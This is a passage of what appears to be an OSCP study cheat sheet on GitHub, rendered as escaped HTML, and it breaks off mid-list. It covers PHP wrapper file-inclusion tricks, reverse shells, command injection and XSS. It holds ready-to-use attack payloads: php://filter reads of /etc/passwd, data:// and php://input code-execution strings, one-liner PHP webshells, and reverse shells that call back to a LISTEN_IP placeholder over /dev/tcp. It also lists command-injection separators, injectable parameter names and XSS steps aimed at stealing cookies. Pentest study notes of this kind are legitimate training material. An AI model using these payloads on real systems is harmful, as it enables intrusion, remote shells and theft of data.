dir=\"auto\"\u003e2.6.5.1 PHP Wrappers\u003c/h4\u003e\u003ca id=\"user-content-2651-php-wrappers\" class=\"anchor\" aria-label=\"Permalink: 2.6.5.1 PHP Wrappers\" href=\"#2651-php-wrappers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.php.net/manual/en/wrappers.php\" rel=\"nofollow\"\u003ePHP Wrappers\u003c/a\u003e are useful for filter\nevasion, for grabbing file contents without it getting executed, and even for\ncode execution.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eUsing \u003ca href=\"https://www.php.net/manual/en/filters.php\" rel=\"nofollow\"\u003e\u003ccode\u003efilter\u003c/code\u003e\u003c/a\u003e \u003ca href=\"https://www.php.net/manual/en/wrappers.php.php\" rel=\"nofollow\"\u003ewrapper\u003c/a\u003e to grab local files:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# filter without any processing to grab plaintext:\nphp://filter/resource=/path/to/flle\n# Example:\ncurl http://example.com/index.php?page=php://filter/resource=/etc/passwd\n\n\n# base64 encode file before grabbing (helps grab php source or binary files)\n# available starting with PHP 5.0.0\nphp://filter/convert.base64-encode/resource=/path/to/file\n# Example:\ncurl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php\n\n\n# ROT13 encode file:\nphp://filter/read=string.rot13/resource=/etc/passwd\n\n# chaining multiple filters with \u0026quot;|\u0026quot;:\nphp://filter/string.toupper|string.rot13/resource=/path/to/file\n\n# list of useful filters:\n# https://www.php.net/manual/en/filters.php\nstring.toupper\nstring.tolower\nstring.rot13\nconvert.base64-encode\nconvert.base64-decode\nzlib.deflate  # i.e. gzip, without headers/trailers\nzlib.inflate  # i.e. gunzip\nbzip2.compress\nbzip2.decompress\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e filter without any processing to grab plaintext:\u003c/span\u003e\nphp://filter/resource=/path/to/flle\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Example:\u003c/span\u003e\ncurl http://example.com/index.php\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003epage=php://filter/resource=/etc/passwd\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e base64 encode file before grabbing (helps grab php source or binary files)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e available starting with PHP 5.0.0\u003c/span\u003e\nphp://filter/convert.base64-encode/resource=/path/to/file\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Example:\u003c/span\u003e\ncurl http://example.com/index.php\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003epage=php://filter/convert.base64-encode/resource=admin.php\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ROT13 encode file:\u003c/span\u003e\nphp://filter/read=string.rot13/resource=/etc/passwd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e chaining multiple filters with \"|\":\u003c/span\u003e\nphp://filter/string.toupper\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003estring.rot13/resource=/path/to/file\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list of useful filters:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://www.php.net/manual/en/filters.php\u003c/span\u003e\nstring.toupper\nstring.tolower\nstring.rot13\nconvert.base64-encode\nconvert.base64-decode\nzlib.deflate  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e i.e. gzip, without headers/trailers\u003c/span\u003e\nzlib.inflate  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e i.e. gunzip\u003c/span\u003e\nbzip2.compress\nbzip2.decompress\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCode execution with \u003ccode\u003eexpect\u003c/code\u003e, \u003ccode\u003edata\u003c/code\u003e, and \u003ccode\u003einput\u003c/code\u003e wrappers:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# run commands directly if 'expect' extension installed (not default):\nexpect://whoami\n\n# inject arbitrary string into the file if 'allow_url_include' setting is enabled.\n# can be used for code execution, XSS, etc.:\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+  # injects \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\n\n# When injecting php code, a good way to test code execution is with:\n\u0026lt;?php phpinfo();?\u0026gt;\n\n# use \u0026quot;data:\u0026quot; to inject executable php code directly into the URL\ndata:text/plain,\u0026lt;?php phpinfo(); ?\u0026gt;\ndata:,\u0026lt;?system($_GET['x']);?\u0026gt;\u0026amp;x=ls\ndata:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=\u0026amp;x=ls\n\n# Use 'php://input' as the query param's value to tell it to look at the POST\n# request body for the text to insert there. Useful for injecting complex\n# php payloads\nphp://input\n# example POST body: \u0026lt;?php system('whoami'); ?\u0026gt;\n\n# FILTER BYPASSES:\n# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto\n# a file path by injecting a NULL byte. E.g.:\n?page=../../../etc/passwd%00\n# You can take this technique further and URL-encode the entire php://filter\n# directive to hopefully bypass server-side filters on it. Or even double-URL-\n# encode the string.\n# Also try bypassing filters with ....// instead of ../\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run commands directly if 'expect' extension installed (not default):\u003c/span\u003e\nexpect://whoami\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e inject arbitrary string into the file if 'allow_url_include' setting is enabled.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can be used for code execution, XSS, etc.:\u003c/span\u003e\ndata://text/plain\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003ebase64,PD9waHAgcGhwaW5mbygpOz8+  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e injects \"\u0026lt;?php phpinfo();?\u0026gt;\"\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e When injecting php code, a good way to test code execution is with:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003ephp \u003cspan class=\"pl-en\"\u003ephpinfo\u003c/span\u003e();\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use \"data:\" to inject executable php code directly into the URL\u003c/span\u003e\ndata:text/plain,\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003ephp \u003cspan class=\"pl-en\"\u003ephpinfo\u003c/span\u003e(); \u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\ndata:,\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003esystem(\u003cspan class=\"pl-smi\"\u003e$_GET\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ex\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e])\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026amp;\u003c/span\u003ex=ls\ndata:\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003ebase64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=\u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003ex=ls\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Use 'php://input' as the query param's value to tell it to look at the POST\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e request body for the text to insert there. Useful for injecting complex\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e php payloads\u003c/span\u003e\nphp://input\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e example POST body: \u0026lt;?php system('whoami'); ?\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e FILTER BYPASSES:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e a file path by injecting a NULL byte. E.g.:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003epage=../../../etc/passwd%00\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e You can take this technique further and URL-encode the entire php://filter\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e directive to hopefully bypass server-side filters on it. Or even double-URL-\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e encode the string.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Also try bypassing filters with ....// instead of ../\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.5.2 One-liner PHP Webshells\u003c/h4\u003e\u003ca id=\"user-content-2652-one-liner-php-webshells\" class=\"anchor\" aria-label=\"Permalink: 2.6.5.2 One-liner PHP Webshells\" href=\"#2652-one-liner-php-webshells\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSimple one-liner web shells for when you can drop/modify a php file:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php system($_GET['cmd']); ?\u0026gt;\n\n\u0026lt;?php echo exec($_POST['cmd']); ?\u0026gt;\n\n\u0026lt;?php echo shell_exec($_REQUEST['cmd']); ?\u0026gt;\n\n\u0026lt;?php echo passthru($_GET['cmd']); ?\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_GET\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003ecmd\u003c/span\u003e'\u003c/span\u003e]); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexec\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_POST\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003ecmd\u003c/span\u003e'\u003c/span\u003e]); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eshell_exec\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_REQUEST\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003ecmd\u003c/span\u003e'\u003c/span\u003e]); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-en\"\u003epassthru\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_GET\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003ecmd\u003c/span\u003e'\u003c/span\u003e]); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eKali has more webshells here: \u003ccode\u003e/usr/share/webshells/php/\u003c/code\u003e, and I have some in the \u003ca href=\"/camercu/oscp-prep/blob/main/tools\"\u003etools\u003c/a\u003e directory\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#54-reverse-shells\"\u003eOne-liner PHP reverse shell\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php $sock=fsockopen(\u0026quot;LISTEN_IP\u0026quot;,443);exec(\u0026quot;/bin/bash -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;); ?\u0026gt;\n\n\u0026lt;?php exec(\u0026quot;/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/LISTEN_IP/443 0\u0026gt;\u0026amp;1'\u0026quot;); ?\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003esock\u003c/span\u003e=\u003cspan class=\"pl-en\"\u003efsockopen\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eLISTEN_IP\u003c/span\u003e\"\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e443\u003c/span\u003e);\u003cspan class=\"pl-en\"\u003eexec\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003e/bin/bash -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u003c/span\u003e\"\u003c/span\u003e); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexec\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003e/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/LISTEN_IP/443 0\u0026gt;\u0026amp;1'\u003c/span\u003e\"\u003c/span\u003e); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/ivan-sincek/php-reverse-shell\"\u003eGreat collection of PHP webshells and reverse shells\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\" rel=\"nofollow\"\u003ePentestmonkey PHP Reverse Shell\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.6 Command Injection\u003c/h3\u003e\u003ca id=\"user-content-266-command-injection\" class=\"anchor\" aria-label=\"Permalink: 2.6.6 Command Injection\" href=\"#266-command-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSome websites pass user input to a shell execution environment (probably with some filtering).\nIf you can bypass the filter, you get code execution!\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTips:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003ewhoami\u003c/code\u003e runs on both Windows and Linux hosts. Good candidate for test injection.\u003c/li\u003e\n\u003cli\u003eprefix command with separator characters: \u003ccode\u003e; | \u0026amp; || \u0026amp;\u0026amp;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003etry url-encoded separators:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e%0A\u003c/code\u003e: newline\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%3B\u003c/code\u003e: semicolon\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eMay need to terminate quoted context before starting your command:\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'; whoami\n\u0026quot;\u0026amp;\u0026amp; whoami\n\u0026quot;\u0026amp; whoami\u0026quot;  # surrounding with quotes\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e; whoami\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\"\u0026amp;\u0026amp; whoami\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\"\u0026amp; whoami\"  # surrounding with quotes\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003esurrounding your command with UNIX subshells for execution:\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$(whoami)\n\u0026gt;(whoami)\n`whoami`\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\u0026gt;(\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003eTo see if you're executing in CMD or Powershell (will print which one):\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"(dir 2\u0026gt;\u0026amp;1 *`|echo CMD);\u0026amp;\u0026lt;# rem #\u0026gt;echo PowerShell\"\u003e\u003cpre\u003e(dir \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u0026amp;1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e`|\u003c/span\u003eecho CMD);\u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;#\u003c/span\u003e rem \u003cspan class=\"pl-c\"\u003e#\u0026gt;\u003c/span\u003e\u003c/span\u003eecho PowerShell\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003etry seeing if you can get a help msg:  \u003ccode\u003e-h\u003c/code\u003e, \u003ccode\u003e--help\u003c/code\u003e, \u003ccode\u003e/?\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003emaybe redirection provides useful info \u003ccode\u003e\u0026lt; /etc/passwd\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eperl injection when opening file:  \u003ccode\u003eecho Injected|\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eif you can't see output of command, try time-based character-by-character extraction:\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003etime\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e [ \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003ecut -c 1\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e==\u003c/span\u003e s ]\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ethen\u003c/span\u003e sleep 5\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efi\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003eif bash restrictions (filtering what commands are executed), see \u003ca href=\"https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions\" rel=\"nofollow\"\u003ebypass guide\u003c/a\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eHere are common URL query params (or form fields) that may be vulnerable to injection:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"?cmd={payload}\n?exec={payload}\n?command={payload}\n?execute{payload}\n?ping={payload}\n?query={payload}\n?jump={payload}\n?code={payload}\n?reg={payload}\n?do={payload}\n?func={payload}\n?arg={payload}\n?option={payload}\n?load={payload}\n?process={payload}\n?step={payload}\n?read={payload}\n?function={payload}\n?req={payload}\n?feature={payload}\n?exe={payload}\n?module={payload}\n?payload={payload}\n?run={payload}\n?print={payload}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e?cmd={payload}\n?exec={payload}\n?command={payload}\n?execute{payload}\n?ping={payload}\n?query={payload}\n?jump={payload}\n?code={payload}\n?reg={payload}\n?do={payload}\n?func={payload}\n?arg={payload}\n?option={payload}\n?load={payload}\n?process={payload}\n?step={payload}\n?read={payload}\n?function={payload}\n?req={payload}\n?feature={payload}\n?exe={payload}\n?module={payload}\n?payload={payload}\n?run={payload}\n?print={payload}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.7 Cross-Site Scripting (XSS)\u003c/h3\u003e\u003ca id=\"user-content-267-cross-site-scripting-xss\" class=\"anchor\" aria-label=\"Permalink: 2.6.7 Cross-Site Scripting (XSS)\" href=\"#267-cross-site-scripting-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:\u003c/p\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Check what remains after any filtering is applied on input: \u003ccode\u003e'';!--\"\u0026lt;XSS\u0026gt;=\u0026amp;{()}\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Try variations of \u003ccode\u003e\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eIf you can get XSS working, consider possible vectors, especially against admin users:\u003c/p\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Steal cookies, authentication (OAuth) tokens, and other sensitive data\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Key-log password entry on login 